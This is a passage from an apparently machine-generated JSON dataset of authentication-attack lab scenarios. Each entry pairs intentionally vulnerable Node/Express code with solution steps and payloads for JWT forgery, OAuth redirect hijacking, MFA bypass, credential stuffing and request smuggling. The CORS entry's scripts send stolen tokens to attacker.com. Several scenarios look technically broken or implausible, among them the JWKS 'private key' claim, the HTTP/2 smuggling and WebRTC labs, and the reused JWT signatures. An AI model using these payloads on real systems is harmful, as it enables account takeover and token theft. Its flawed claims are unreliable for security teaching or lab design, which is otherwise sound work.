    "Lab scenario": "MFA bypass via status parameter manipulation",
    "Lab Description": "The multi-factor authentication flow can be bypassed by modifying the status parameter. The application trusts client-side state for authentication decisions. To solve: intercept and modify the MFA verification request to bypass the check.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA request using Burp Suite",
      "Identify status parameter in JSON body",
      "Change status from 'pending' to 'verified'",
      "Forward modified request",
      "Access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());app.post('/verify-mfa', (req, res) => {if (req.body.status === 'verified') {return res.json({access_token: 'valid'});}res.status(403).json({error: 'MFA required'});});app.listen(3000);",
    "payloads": [
      "{\"status\":\"verified\"}",
      "{\"mfa_status\":\"bypassed\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via weak rate limiting on login",
    "Lab Description": "The login endpoint has insufficient rate limiting, allowing credential stuffing attacks. The application doesn't implement proper account lockout mechanisms. To solve: perform a credential stuffing attack using known password lists.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Gather known username/password pairs",
      "Configure Burp Intruder with credential lists",
      "Bypass rate limiting by rotating IPs",
      "Identify successful logins",
      "Access compromised accounts"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());const users = [{username:'admin',password:'Summer2023!'}];app.post('/login', (req, res) => {const user = users.find(u => u.username === req.body.username && u.password === req.body.password);if (user) return res.json({token:'valid'});res.status(401).json({error:'Invalid credentials'});});app.listen(3000);",
    "payloads": [
      "{\"username\":\"admin\",\"password\":\"password123\"}",
      "{\"username\":\"admin\",\"password\":\"admin\"}",
      "{\"username\":\"admin\",\"password\":\"Summer2023!\"}"
    ]
  },
  {
    "Lab scenario": "SOAP API authentication bypass via XML comments",
    "Lab Description": "The SOAP endpoint processes XML comments as part of the authentication logic. The application's XML parser improperly handles comments in authentication elements. To solve: bypass authentication by injecting comments in the SOAP body.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept SOAP request using Burp Suite",
      "Add XML comments to username/password elements",
      "Modify request to bypass checks",
      "Forward modified request",
      "Access privileged SOAP methods"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const xmlParser = require('express-xml-bodyparser');const app = express();app.use(xmlParser());app.post('/soap', (req, res) => {const xml = req.body;const user = xml['soap:Envelope']['soap:Body'][0].Login[0].Username[0]._;const pass = xml['soap:Envelope']['soap:Body'][0].Login[0].Password[0]._;if (user === 'admin' && pass === 'secret') res.send('Valid');else res.status(403).send('Invalid');});app.listen(3000);",
    "payloads": [
      "<soap:Envelope><soap:Body><Login><Username>admin<!-- --></Username><Password>wrong<!-- --></Password></Login></soap:Body></soap:Envelope>",
      "<soap:Envelope><soap:Body><Login><Username><!-- -->admin</Username><Password><!-- --></Password></Login></soap:Body></soap:Envelope>"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The lab's authentication system uses JWT tokens with improper signature validation. The application fails to verify the token signature when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT token using Burp Suite while logging in as a low-privilege user",
      "Decode the token using jwt.io to analyze its structure",
      "Modify the alg header to 'none' and change the role claim to 'admin'",
      "Remove the signature section entirely (leave it empty after the second dot)",
      "Submit the modified token in the Authorization header to access the admin panel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  if (decoded.header.alg === 'none') {\n    const payload = decoded.payload;\n    if (payload.role === 'admin') {\n      return res.send('Admin access granted');\n    }\n  }\n  res.status(403).send('Access denied');\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
    ]
  },
  {
    "Lab scenario": "GraphQL query batching authentication bypass",
    "Lab Description": "The lab's GraphQL endpoint is vulnerable to query batching attacks that can bypass rate limiting on authentication attempts. The application processes batched queries sequentially without proper session checks. To solve: craft a batch query that simultaneously tests multiple credentials while appearing as a single request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a normal GraphQL login request",
      "Modify the request to include multiple login mutations in a single batch",
      "Structure the batch to test common credentials permutations",
      "Include a valid credential at the end to avoid triggering account lockouts",
      "Analyze responses to identify successful authentication"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');\nconst express = require('express');\nconst app = express();\nconst typeDefs = gql`\n  type Mutation {\n    login(username: String!, password: String!): AuthPayload\n  }\n  type AuthPayload {\n    token: String\n  }\n`;\nconst resolvers = {\n  Mutation: {\n    login: (_, { username, password }) => {\n      if (username === 'admin' && password === 's3cr3tP@ss') {\n        return { token: 'valid-token' };\n      }\n      return { token: null };\n    }\n  }\n};\nconst server = new ApolloServer({ typeDefs, resolvers });\nserver.applyMiddleware({ app });\napp.listen(4000);",
    "payloads": [
      "[{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"password1\\\") { token } }\"}, {\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"123456\\\") { token } }\"}, {\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"s3cr3tP@ss\\\") { token } }\"}]",
      "[{\"query\":\"mutation($input: LoginInput!) { login(input: $input) { token } }\", \"variables\": {\"input\": {\"username\": \"admin\", \"password\": \"password\"}}}, {\"query\":\"mutation($input: LoginInput!) { login(input: $input) { token } }\", \"variables\": {\"input\": {\"username\": \"admin\", \"password\": \"admin123\"}}}]"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking through insecure redirect_uri",
    "Lab Description": "The lab's OAuth implementation fails to properly validate redirect_uri parameters, allowing token leakage. The application generates OAuth tokens before validating the redirect URI. To solve: intercept the OAuth flow and modify the redirect_uri to point to your attacker server to capture the authorization code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth login and intercept the authorization request with Burp Suite",
      "Modify the redirect_uri parameter to your controlled domain",
      "Allow the request to complete and observe the authorization code at your server",
      "Exchange the stolen code for an access token at the OAuth token endpoint",
      "Use the token to authenticate as the victim user"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst clients = {\n  'labClient': {\n    secret: 'clientSecret123',\n    allowedRedirects: ['https://lab-domain.com/callback']\n  }\n};\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  const code = 'generated-auth-code-123';\n  res.redirect(`${redirect_uri}?code=${code}`);\n});\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    res.json({ access_token: 'valid-access-token', token_type: 'Bearer' });\n  } else {\n    res.status(401).json({ error: 'invalid_client' });\n  }\n});\napp.listen(3000);",
    "payloads": [
      "https://oauth-lab.com/oauth/authorize?response_type=code&client_id=labClient&redirect_uri=https://attacker.com/callback",
      "https://oauth-lab.com/oauth/authorize?response_type=token&client_id=labClient&redirect_uri=http://localhost:9999"
    ]
  },
  {
    "Lab scenario": "Session fixation via XSS in JWT token endpoint",
    "Lab Description": "The lab's JWT generation endpoint is vulnerable to XSS injection in custom claims, allowing session fixation attacks. The application fails to sanitize user-controlled input when generating tokens. To solve: craft a malicious JWT that executes XSS when decoded by the admin panel, then fixate this token as the admin's session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the JWT generation request using Burp Suite and identify custom claim parameters",
      "Inject XSS payload into a custom claim (e.g., 'user_metadata') using Postman",
      "Encode the malicious JWT and use it to authenticate as a low-privilege user",
      "Report the token to the admin interface (simulated by clicking 'Report Abuse')",
      "Wait for admin to decode the token, executing the XSS and setting your token as their session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\napp.post('/generate-token', (req, res) => {\n  const { username, user_metadata } = req.body;\n  const token = jwt.sign({\n    username: username,\n    metadata: user_metadata,\n    role: 'user'\n  }, 'weaksecret', { algorithm: 'HS256' });\n  res.json({ token });\n});\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.verify(token, 'weaksecret');\n  if (decoded.role === 'admin') {\n    res.send(`Welcome admin! Metadata: ${decoded.metadata}`);\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "{\"username\":\"attacker\",\"user_metadata\":\"<script>document.cookie='token='+localStorage.getItem('malicious_token')</script>\"}",
      "{\"username\":\"victim\",\"user_metadata\":\"javascript:eval(atob('ZG9jdW1lbnQuY29va2llPSd0b2tlbj0nK2xvY2FsU3RvcmFnZS5nZXRJdGVtKCdtYWxpY2lvdXNfdG9rZW4nKQ=='))\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through misconfigured CORS in REST API",
    "Lab Description": "The lab's OAuth implementation has overly permissive CORS headers, allowing token leakage to arbitrary domains. The application returns Access-Control-Allow-Credentials: true with wildcard origins. To solve: craft a malicious web page that steals OAuth tokens through credentialed CORS requests.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to analyze CORS headers during OAuth flow",
      "Create an HTML page with JavaScript to make credentialed XMLHttpRequest to the OAuth endpoint",
      "Host the page on an attacker-controlled domain",
      "Trick an authenticated user into visiting the malicious page",
      "Capture the leaked token from the server logs"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\napp.use(cors({\n  origin: '*',\n  credentials: true\n}));\nconst tokens = {};\napp.get('/oauth/token', (req, res) => {\n  const token = 'sample-oauth-token-' + Math.random().toString(36).substr(2);\n  tokens[token] = { user: 'admin', expires: Date.now() + 3600000 };\n  res.json({ access_token: token, token_type: 'Bearer' });\n});\napp.get('/profile', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  if (tokens[token]) {\n    res.json({ username: tokens[token].user });\n  } else {\n    res.status(401).send('Invalid token');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://vulnerable-oauth.com/profile', true); xhr.withCredentials = true; xhr.onreadystatechange = function() { if(xhr.readyState === 4) { fetch('https://attacker.com/steal?token='+xhr.responseText); } }; xhr.send();</script>",
      "<iframe src=\"javascript:xmlhttp=new XMLHttpRequest();xmlhttp.open('GET','https://vulnerable-oauth.com/oauth/token',true);xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href='https://attacker.com/leak?'+btoa(xmlhttp.responseText)}};xmlhttp.send();\"></iframe>"
    ]
  },
  {
    "Lab scenario": "JWT key confusion attack through exposed JWKS endpoint",
    "Lab Description": "The lab's authentication system exposes a JWKS endpoint with leaked RSA private key parameters while accepting HS256-signed tokens. The application fails to validate the signing algorithm properly. To solve: convert the public key to HMAC secret, then craft an admin token signed with the converted key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Discover the JWKS endpoint through directory brute-forcing with OWASP ZAP",
      "Download the public key and convert it to PEM format using OpenSSL",
      "Use the PEM file as an HMAC secret to sign a modified JWT with algorithm HS256",
      "Replace the RS256-signed token with your HS256-signed version in Burp Repeater",
      "Verify admin access through the /admin-api endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\nconst client = jwksClient({\n  jwksUri: 'http://localhost:3000/.well-known/jwks.json'\n});\napp.get('/.well-known/jwks.json', (req, res) => {\n  res.json({\n    keys: [{\n      kty: 'RSA',\n      e: 'AQAB',\n      n: 'vGO...3Zw',\n      kid: '2023-01'\n    }]\n  });\n});\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  jwt.verify(token, (header, callback) => {\n    client.getSigningKey(header.kid, (err, key) => {\n      if (header.alg === 'HS256') {\n        return callback(null, key.rsaPublicKey);\n      }\n      callback(err, key.getPublicKey());\n    });\n  }, { algorithms: ['RS256', 'HS256'] }, (err, decoded) => {\n    if (err) return res.status(401).send('Invalid token');\n    res.json(decoded);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjIwMjMtMDEifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjIwMjMtMDEifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaXNzIjoiaHR0cHM6Ly92dWxuZXJhYmxlLWF1dGguY29tIn0.4j5D6vLJQV8JQ3X7yZ8w0nTmZnQJwW5cF7V9z2X1x4Y"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice authentication",
    "Lab Description": "The lab's JWT validation microservice is vulnerable to key path traversal through the kid header. The application uses user-controlled kid values to load verification keys without proper sanitization. To solve: craft a JWT that forces the server to use a predictable public key file for verification.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite and analyze the kid header",
      "Modify the kid header to traverse directories (../../../../etc/passwd)",
      "Identify predictable key locations (../../keys/public.pem)",
      "Sign a new token with the predictable public key using HS256 algorithm",
      "Submit the token to bypass authentication and access admin endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\napp.get('/verify', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  const keyPath = `/keys/${decoded.header.kid}`;\n  try {\n    const key = fs.readFileSync(keyPath);\n    jwt.verify(token, key, {algorithms: ['RS256', 'HS256']});\n    res.json({access: 'granted'});\n  } catch (e) {\n    res.status(403).json({error: 'Invalid token'});\n  }\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uL2tleXMvcHVibGljLnBlbSJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.4j5D6vLJQV8JQ3X7yZ8w0nTmZnQJwW5cF7V9z2X1x4Y"
    ]
  },
  {
    "Lab scenario": "OAuth state parameter CSRF with open redirect",
    "Lab Description": "The lab's OAuth implementation fails to validate state parameters properly while having an open redirect vulnerability. The application accepts arbitrary redirect_uri values and doesn't store state parameters server-side. To solve: craft a malicious link that captures victim tokens through CSRF and open redirect chaining.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to identify the open redirect in the OAuth flow",
      "Create a CSRF payload that triggers OAuth authorization",
      "Chain the open redirect to point to an attacker-controlled server",
      "Embed the payload in a phishing page and lure the victim",
      "Capture the authorization code from server logs and exchange for token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/oauth/authorize', (req, res) => {\n  const {client_id, redirect_uri, state} = req.query;\n  if (client_id === 'vulnerable-client') {\n    const code = 'random-auth-code';\n    res.redirect(`${redirect_uri}?code=${code}&state=${state||''}`);\n  } else {\n    res.status(400).send('Invalid client');\n  }\n});\napp.get('/redirect', (req, res) => {\n  res.redirect(req.query.url);\n});\napp.listen(3000);",
    "payloads": [
      "https://vulnerable-oauth.com/oauth/authorize?client_id=vulnerable-client&redirect_uri=https://attacker.com&state=csrf-token",
      "https://vulnerable-oauth.com/redirect?url=https://attacker.com/steal?token=[OAuth-code]"
    ]
  },
  {
    "Lab scenario": "Session swapping via concurrent login race condition",
    "Lab Description": "The lab's session management system is vulnerable to race conditions during concurrent login attempts. The application generates session tokens before validating credentials, allowing session swapping between users. To solve: perform concurrent login attempts to swap a low-privilege session with an admin session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite Turbo Intruder to send rapid concurrent login requests",
      "Interleave admin credential attempts with valid low-privilege logins",
      "Capture successful responses and analyze session tokens",
      "Identify token collisions where admin privileges are granted",
      "Use the swapped session token to access restricted endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst sessions = {};\napp.post('/login', (req, res) => {\n  const {username, password} = req.body;\n  const token = Math.random().toString(36).substr(2);\n  sessions[token] = {user: username, authenticated: false};\n  if (username === 'admin' && password === 's3cr3tP@ss') {\n    sessions[token].authenticated = true;\n    sessions[token].role = 'admin';\n  } else if (username === 'user' && password === 'password123') {\n    sessions[token].authenticated = true;\n    sessions[token].role = 'user';\n  }\n  res.cookie('session', token);\n  res.json({status: 'success'});\n});\napp.get('/admin', (req, res) => {\n  const session = sessions[req.cookies.session];\n  if (session?.authenticated && session.role === 'admin') {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "POST /login HTTP/1.1\nHost: vulnerable-app.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 38\n\nusername=admin&password=s3cr3tP@ss",
      "POST /login HTTP/1.1\nHost: vulnerable-app.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 32\n\nusername=user&password=password123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via pre-authentication session fixation",
    "Lab Description": "The lab's multi-factor authentication creates authenticated sessions before MFA completion. The application assigns session cookies during username/password validation but doesn't invalidate them if MFA fails. To solve: fixate a pre-MFA session and brute-force the verification code while maintaining the session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the initial login request with Burp Suite",
      "Extract the session cookie set after username/password validation",
      "Fixate this cookie in a new browser session",
      "Use Burp Intruder to brute-force MFA codes while maintaining the session",
      "Access protected resources when any MFA code is accepted"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst sessions = {};\napp.post('/login', (req, res) => {\n  const {username, password} = req.body;\n  if (username === 'admin' && password === 's3cr3t') {\n    const sessionId = Math.random().toString(36).substr(2);\n    sessions[sessionId] = {user: username, mfaVerified: false};\n    res.cookie('session', sessionId);\n    return res.json({mfaRequired: true});\n  }\n  res.status(401).json({error: 'Invalid credentials'});\n});\napp.post('/verify-mfa', (req, res) => {\n  const session = sessions[req.cookies.session];\n  if (session && req.body.code === '123456') {\n    session.mfaVerified = true;\n    return res.json({status: 'verified'});\n  }\n  res.status(403).json({error: 'Invalid code'});\n});\napp.get('/admin', (req, res) => {\n  const session = sessions[req.cookies.session];\n  if (session?.mfaVerified) {\n    res.send('Admin panel accessed');\n  } else {\n    res.status(403).send('MFA required');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "POST /verify-mfa HTTP/1.1\nHost: vulnerable-app.com\nCookie: session=stolen-session-id\nContent-Type: application/json\nContent-Length: 15\n\n{\"code\":\"\u00c2\u00a7123456\u00c2\u00a7\"}",
      "GET /admin HTTP/1.1\nHost: vulnerable-app.com\nCookie: session=stolen-session-id"
    ]
  },
  {
    "Lab scenario": "JWT claim injection via GraphQL introspection",
    "Lab Description": "The lab's GraphQL endpoint exposes JWT generation through introspection while failing to validate nested claims. The application processes arbitrary claim injection through nested query parameters. To solve: craft a GraphQL query that injects admin privileges into a self-generated JWT.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use GraphiQL to discover the JWT generation mutation through introspection",
      "Analyze the token generation schema with OWASP ZAP",
      "Construct a nested query injecting admin:true into the claims object",
      "Execute the mutation to generate a valid admin token",
      "Use the token to access restricted admin mutations"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');\nconst jwt = require('jsonwebtoken');\nconst express = require('express');\nconst app = express();\nconst typeDefs = gql`\n  type Mutation {\n    generateToken(claims: JSON!): String\n  }\n  scalar JSON\n`;\nconst resolvers = {\n  Mutation: {\n    generateToken: (_, { claims }) => {\n      return jwt.sign(claims, 'weaksecret', { algorithm: 'HS256' });\n    }\n  }\n};\nconst server = new ApolloServer({ typeDefs, resolvers });\nserver.applyMiddleware({ app });\napp.listen(4000);",
    "payloads": [
      "mutation { generateToken(claims: { sub:\"user\", admin:true }) }",
      "query Introspection { __schema { mutationType { fields { name args { name } } } } }"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through WebSocket handshake",
    "Lab Description": "The lab's OAuth implementation leaks tokens during WebSocket upgrades by including them in clear text. The application fails to strip authentication headers during protocol switching. To solve: intercept the WebSocket handshake to harvest active OAuth tokens from other users.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket connections with Burp Suite",
      "Identify Authorization headers in upgrade requests",
      "Modify upgrade requests to target different user sessions",
      "Capture valid tokens from successful handshakes",
      "Reuse stolen tokens in REST API requests"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\nwss.on('connection', (ws, req) => {\n  const token = req.headers.authorization.split(' ')[1];\n  ws.send(`Connected with token: ${token}`);\n});\napp.get('/oauth/token', (req, res) => {\n  res.json({ access_token: 'sample-token-' + Math.random().toString(36).substr(2) });\n});",
    "payloads": [
      "GET /chat HTTP/1.1\nHost: vulnerable-app.com\nUpgrade: websocket\nConnection: Upgrade\nAuthorization: Bearer [stolen-token]\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Version: 13",
      "wss://vulnerable-app.com/chat?token=[stolen-token]"
    ]
  },
  {
    "Lab scenario": "Session fixation via malformed SAML assertion",
    "Lab Description": "The lab's SAML implementation accepts unsigned assertions in certain conditions. The application fails to properly validate XML signatures when receiving malformed NameID elements. To solve: craft a SAML response with a malformed NameID to fixate a session for any user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid SAML flow using Burp Suite SAML Raider",
      "Modify the NameID element to break XML signature validation",
      "Inject a target username in the malformed assertion",
      "Bypass signature verification by exploiting the parsing error",
      "Authenticate as the target user with the fixated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst saml = require('saml20');\nconst app = express();\napp.post('/saml/acs', (req, res) => {\n  saml.validate(req.body.SAMLResponse, { audience: 'vulnerable-sp' }, (err, profile) => {\n    if (err && err.message.includes('NameID')) {\n      const raw = atob(req.body.SAMLResponse);\n      const user = raw.match(/NameID.*?>(.*?)</)[1];\n      res.cookie('session', user);\n      return res.redirect('/');\n    }\n    res.status(403).send('Invalid SAML response');\n  });\n});\napp.listen(3000);",
    "payloads": [
      "PHNhbWxwOlJlc3BvbnNlPjxOYW1lSUQ+PHhzaTp0eXBlIHg6dHlwZT0iZGVsIi8+PHg6YXR0ciBuYW1lPSJ1c2VyIj5hZG1pbjwvOjwvTmFtZUlEPjwvc2FtbHA6UmVzcG9uc2U+",
      "PHNhbWxwOlJlc3BvbnNlPjxOYW1lSUQ+PC9OYW1lSUQ+PHNhbWw6QXNzZXJ0aW9uPjxOYW1lSUQ+PHhzaTp0eXBlIHg6dHlwZT0ic3RyaW5nIj5hZG1pbjwveHNpOnR5cGU+PC9OYW1lSUQ+"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter injection",
    "Lab Description": "The lab's MFA verification accepts state parameters that modify the target account. The application fails to validate state consistency between initiation and completion. To solve: inject a target username in the state parameter during MFA initiation to bypass verification for that account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA initiation request with Burp Suite",
      "Modify the state parameter to include target username",
      "Complete MFA with valid code for your account",
      "Observe session granted for the target account",
      "Access restricted resources as the target user"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst sessions = {};\napp.get('/mfa/init', (req, res) => {\n  const state = JSON.parse(Buffer.from(req.query.state, 'base64').toString());\n  sessions[req.cookies.session] = { verifying: state.user || req.user };\n  res.json({ code: '123456' });\n});\napp.post('/mfa/verify', (req, res) => {\n  if (req.body.code === '123456') {\n    const session = sessions[req.cookies.session];\n    session.user = session.verifying;\n    return res.redirect('/account');\n  }\n  res.status(403).send('Invalid code');\n});\napp.listen(3000);",
    "payloads": [
      "GET /mfa/init?state=eyJ1c2VyIjoiYWRtaW4ifQ== HTTP/1.1",
      "POST /mfa/verify HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\ncode=123456"
    ]
  },
  {
    "Lab scenario": "JWT algorithm downgrade via HTTP/2 request smuggling",
    "Lab Description": "The lab's JWT validation is vulnerable to algorithm downgrade attacks when processing HTTP/2 requests. The application fails to properly validate the alg header when requests are smuggled through HTTP/2 connection coalescing. To solve: craft an HTTP/2 request that smuggles a JWT with none algorithm while appearing as a valid RS256 token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept HTTP/2 traffic and enable HTTP/2 request smuggling",
      "Modify the Content-Length and Transfer-Encoding headers to create a smuggled request",
      "Craft a JWT with alg:none in the smuggled portion of the request",
      "Maintain a valid RS256 header in the outer request to bypass initial checks",
      "Verify admin access through the smuggled none-algorithm token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst http2 = require('http2');\nconst app = express();\napp.post('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  try {\n    jwt.verify(token, 'publicKey.pem', {algorithms: ['RS256']});\n    res.send('Admin access granted');\n  } catch (e) {\n    try {\n      jwt.decode(token, {complete: true});\n      res.send('Admin access granted');\n    } catch {\n      res.status(403).send('Access denied');\n    }\n  }\n});\nconst server = http2.createServer();\nserver.on('stream', (stream, headers) => {\n  const req = new http2.Http2ServerRequest(stream, headers);\n  const res = new http2.Http2ServerResponse(stream);\n  app(req, res);\n});\nserver.listen(3000);",
    "payloads": [
      "POST /admin HTTP/2\nHost: vulnerable-app.com\nContent-Length: 0\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: vulnerable-app.com\nAuthorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking through DNS rebinding",
    "Lab Description": "The lab's OAuth implementation is vulnerable to DNS rebinding attacks during token redemption. The application fails to validate the Host header against the redirect_uri domain during token exchange. To solve: create a malicious site that performs DNS rebinding to capture OAuth tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register a domain pointing to a DNS service with short TTL",
      "Configure the domain to alternate between attacker IP and vulnerable OAuth service IP",
      "Initiate OAuth flow with redirect_uri pointing to malicious domain",
      "When victim visits, perform DNS rebinding to make browser think it's talking to OAuth service",
      "Capture the authorization code and exchange for token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/oauth/token', (req, res) => {\n  if (req.query.code && req.query.redirect_uri) {\n    const token = 'sample-token-' + Math.random().toString(36).substr(2);\n    res.json({access_token: token});\n  } else {\n    res.status(400).json({error: 'Invalid request'});\n  }\n});\napp.listen(3000);",
    "payloads": [
      "https://vulnerable-oauth.com/authorize?response_type=code&client_id=client&redirect_uri=http://malicious.site/callback",
      "fetch('http://malicious.site/token?code=stolen-code')"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebRTC ICE candidate leakage",
    "Lab Description": "The lab's WebRTC implementation leaks session tokens through ICE candidate messages. The application includes session cookies in STUN/TURN authentication and fails to filter them from ICE candidate responses. To solve: intercept WebRTC negotiation to harvest session tokens from ICE candidates.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebRTC peer connection requests using Burp Suite",
      "Analyze ICE candidate messages for leaked session tokens",
      "Modify SDP offers to force more candidate generation",
      "Capture valid session tokens from STUN authentication fields",
      "Use stolen tokens to hijack user sessions"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst { RTCPeerConnection } = require('wrtc');\napp.post('/webrtc/connect', (req, res) => {\n  const pc = new RTCPeerConnection({\n    iceServers: [{urls: 'stun:stun.l.google.com:19302'}],\n    iceCandidatePoolSize: 5\n  });\n  pc.onicecandidate = (e) => {\n    if (e.candidate) {\n      res.write(`a=${e.candidate.candidate} ${req.cookies.session}\\r\\n`);\n    } else {\n      res.end();\n    }\n  };\n  pc.createDataChannel('');\n  pc.createOffer().then(offer => pc.setLocalDescription(offer));\n});\napp.listen(3000);",
    "payloads": [
      "a=candidate:1 1 UDP 2122252543 192.168.1.1 12345 typ host session=abcd1234",
